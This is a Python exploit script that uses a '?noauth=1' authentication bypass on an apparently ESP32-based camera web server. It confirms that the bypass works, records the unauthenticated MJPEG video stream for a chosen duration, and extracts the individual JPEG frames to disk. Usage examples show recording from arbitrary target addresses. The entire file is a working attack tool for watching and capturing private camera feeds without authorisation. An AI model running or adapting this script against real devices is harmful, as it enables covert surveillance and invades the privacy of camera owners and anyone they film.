#!/usr/bin/env python3
"""
MJPEG Stream Capture via Authentication Bypass

Accesses the MJPEG stream at /stream?noauth=1 (bypassing JWT authentication),
records the stream for a specified duration, and optionally extracts individual
JPEG frames to a directory.
"""

import argparse
import os
import sys
import time
import urllib.request
import urllib.error


DEFAULT_TARGET = "http://192.168.4.1"
JPEG_SOI = b"\xff\xd8"  # Start of Image
JPEG_EOI = b"\xff\xd9"  # End of Image


def verify_auth_bypass(target):
    """Check that /stream requires auth but /stream?noauth=1 bypasses it."""
    print("[*] Verifying authentication bypass...")

    # Check normal stream (should be 401)
    # Note: ESP32 web server doesn't support HEAD on stream endpoints,
    # so we use GET with a short timeout and read only a small amount.
    url_normal = f"{target}/stream"
    try:
        req = urllib.request.Request(url_normal)
        resp = urllib.request.urlopen(req, timeout=5)
        normal_status = resp.getcode()
        resp.read(1)  # read minimal data to confirm
        resp.close()
    except urllib.error.HTTPError as e:
        normal_status = e.code
    except urllib.error.URLError as e:
        print(f"ERROR: Could not connect to {target}: {e.reason}", file=sys.stderr)
        sys.exit(1)

    # Check bypass stream (should be 200)
    url_bypass = f"{target}/stream?noauth=1"
    try:
        req = urllib.request.Request(url_bypass)
        resp = urllib.request.urlopen(req, timeout=5)
        bypass_status = resp.getcode()
        content_type = resp.headers.get("Content-Type", "")
        resp.read(1)  # read minimal data to confirm
        resp.close()
    except urllib.error.HTTPError as e:
        bypass_status = e.code
        content_type = ""
    except urllib.error.URLError as e:
        print(f"ERROR: Could not connect to {target}: {e.reason}", file=sys.stderr)
        sys.exit(1)

    print(f"    /stream          -> HTTP {normal_status} "
          f"({'blocked' if normal_status == 401 else 'OPEN'})")
    print(f"    /stream?noauth=1 -> HTTP {bypass_status} "
          f"({'bypass works' if bypass_status == 200 else 'blocked'})")

    if bypass_status == 200:
        if "multipart" in content_type:
            print(f"    Content-Type: {content_type}")
        print("[+] Authentication bypass confirmed via ?noauth=1 parameter")
    else:
        print("[!] Bypass did not return 200 - the device may not have this vulnerability")

    print()

    # Give the ESP32 time to release the stream connection before
    # we open a new one for capture (single-client stream limitation).
    if bypass_status == 200:
        time.sleep(1)

    return bypass_status == 200


def capture_stream(target, duration, output_file):
    """Capture the MJPEG stream for the specified duration."""
    url = f"{target}/stream?noauth=1"
    print(f"[*] Connecting to {url}")
    print(f"[*] Recording for {duration} seconds (Ctrl+C to stop early)...")

    try:
        req = urllib.request.Request(url)
        resp = urllib.request.urlopen(req, timeout=duration + 10)
    except urllib.error.HTTPError as e:
        print(f"ERROR: HTTP {e.code} - {e.reason}", file=sys.stderr)
        sys.exit(1)
    except urllib.error.URLError as e:
        print(f"ERROR: Could not connect: {e.reason}", file=sys.stderr)
        sys.exit(1)

    total_bytes = 0
    frame_count = 0
    start_time = time.time()
    data = bytearray()

    try:
        while time.time() - start_time < duration:
            remaining = duration - (time.time() - start_time)
            if remaining <= 0:
                break

            chunk = resp.read(4096)
            if not chunk:
                break

            data.extend(chunk)
            total_bytes += len(chunk)

            # Count JPEG frames by SOI markers
            frame_count = data.count(JPEG_SOI)

            elapsed = time.time() - start_time
            sys.stdout.write(
                f"\r[*] {elapsed:.1f}s | {total_bytes:,} bytes | "
                f"~{frame_count} frames | "
                f"{total_bytes / 1024:.1f} KB"
            )
            sys.stdout.flush()

    except KeyboardInterrupt:
        print("\n[*] Capture interrupted by user")
    except Exception as e:
        print(f"\n[!] Stream error: {e}")
    finally:
        try:
            resp.close()
        except Exception:
            pass

    elapsed = time.time() - start_time
    print()
    print()
    print(f"[+] Capture complete")
    print(f"    Duration:    {elapsed:.1f} seconds")
    print(f"    Total data:  {total_bytes:,} bytes ({total_bytes / 1024:.1f} KB)")
    print(f"    Frames:      ~{frame_count}")
    if elapsed > 0:
        print(f"    Data rate:   {total_bytes / elapsed / 1024:.1f} KB/s")
        if frame_count > 0:
            print(f"    Frame rate:  ~{frame_count / elapsed:.1f} fps")

    if output_file:
        with open(output_file, "wb") as f:
            f.write(data)
        print(f"    Saved to:    {output_file}")

    return bytes(data), frame_count


def extract_frames(data, output_dir):
    """Extract individual JPEG frames from MJPEG stream data."""
    if not os.path.exists(output_dir):
        os.makedirs(output_dir)

    frames = []
    pos = 0

    while pos < len(data):
        # Find next JPEG SOI marker
        soi_pos = data.find(JPEG_SOI, pos)
        if soi_pos == -1:
            break

        # Find corresponding EOI marker
        eoi_pos = data.find(JPEG_EOI, soi_pos + 2)
        if eoi_pos == -1:
            break

        # Extract the complete JPEG (SOI through EOI inclusive)
        frame_data = data[soi_pos:eoi_pos + 2]

        # Validate it looks like a JPEG (starts with SOI, ends with EOI)
        if len(frame_data) > 100:  # Skip tiny fragments
            frames.append(frame_data)

        pos = eoi_pos + 2

    print(f"[*] Extracting {len(frames)} JPEG frames to {output_dir}/")
    print()

    for i, frame in enumerate(frames):
        filename = os.path.join(output_dir, f"frame_{i:04d}.jpg")
        with open(filename, "wb") as f:
            f.write(frame)
        print(f"    {filename} ({len(frame):,} bytes)")

    print()
    print(f"[+] Extracted {len(frames)} frames to {output_dir}/")

    if frames:
        sizes = [len(f) for f in frames]
        print(f"    Smallest: {min(sizes):,} bytes")
        print(f"    Largest:  {max(sizes):,} bytes")
        print(f"    Average:  {sum(sizes) // len(sizes):,} bytes")

    return frames


def main():
    parser = argparse.ArgumentParser(
        description="Capture MJPEG stream via the ?noauth=1 authentication bypass. "
                    "Records the unauthenticated camera feed and extracts frames.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s
      Verify the auth bypass works (no recording)

  %(prog)s --duration 10 --output recording.mjpeg
      Record 10 seconds of stream to file

  %(prog)s --duration 30 --output stream.mjpeg --extract-frames frames/
      Record 30 seconds and extract individual JPEG frames

  %(prog)s --target http://10.0.0.5 --duration 60 --output capture.mjpeg
      Record from a specific target for 60 seconds

  %(prog)s --extract-frames frames/ --input existing.mjpeg
      Extract frames from a previously recorded MJPEG file
""")
    parser.add_argument("--target", "-t", default=DEFAULT_TARGET,
                        help="Device URL (default: %(default)s)")
    parser.add_argument("--duration", "-d", type=float, default=0,
                        help="Recording duration in seconds (0 = verify only, default: 0)")
    parser.add_argument("--output", "-o",
                        help="Output file for raw MJPEG stream data")
    parser.add_argument("--extract-frames", "-e", metavar="DIR",
                        help="Extract individual JPEG frames to specified directory")
    parser.add_argument("--input", "-i",
                        help="Read from a previously saved MJPEG file instead of live capture")
    parser.add_argument("--skip-verify", action="store_true",
                        help="Skip the initial auth bypass verification step")

    args = parser.parse_args()

    target = args.target.rstrip("/")

    print("=" * 60)
    print("MJPEG Stream Capture - Authentication Bypass")
    print("=" * 60)
    print()

    # If reading from a file, skip network operations
    if args.input:
        print(f"[*] Reading from saved file: {args.input}")
        try:
            with open(args.input, "rb") as f:
                data = f.read()
        except FileNotFoundError:
            print(f"ERROR: File not found: {args.input}", file=sys.stderr)
            sys.exit(1)

        frame_count = data.count(JPEG_SOI)
        print(f"[+] Read {len(data):,} bytes, ~{frame_count} frames")
        print()

        if args.extract_frames:
            extract_frames(data, args.extract_frames)

        return

    # Verify the bypass works
    if not args.skip_verify:
        bypass_works = verify_auth_bypass(target)
        if not bypass_works:
            print("[!] Authentication bypass failed. Aborting.")
            sys.exit(1)

    # Record if duration specified
    if args.duration > 0:
        data, frame_count = capture_stream(target, args.duration, args.output)

        if args.extract_frames and data:
            print()
            extract_frames(data, args.extract_frames)
    else:
        if not args.skip_verify:
            print("[*] No --duration specified. Use --duration N to record N seconds.")
        else:
            print("[*] Nothing to do. Specify --duration to record or --input to process a file.")

    print()
    print("[*] Done.")


if __name__ == "__main__":
    main()
